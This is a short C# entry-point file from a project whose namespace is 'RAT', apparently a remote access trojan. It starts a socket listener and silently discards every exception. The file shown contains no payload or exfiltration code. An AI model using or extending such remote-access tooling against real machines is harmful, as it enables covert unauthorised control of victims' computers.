using RAT.src.SocketLogic;
using System;

namespace RAT
{
    /// <summary>
    /// Out main startup class.
    /// </summary>
    internal class Program
    {
        /// <summary>
        /// Programs entry point.
        /// </summary>
        /// <param name="args">Program startup arguments.</param>
        private static void Main(string[] args)
        {
            try
            {
                new SocketLogic().StartListening();
            }
            catch (Exception) { }
        }
    }
}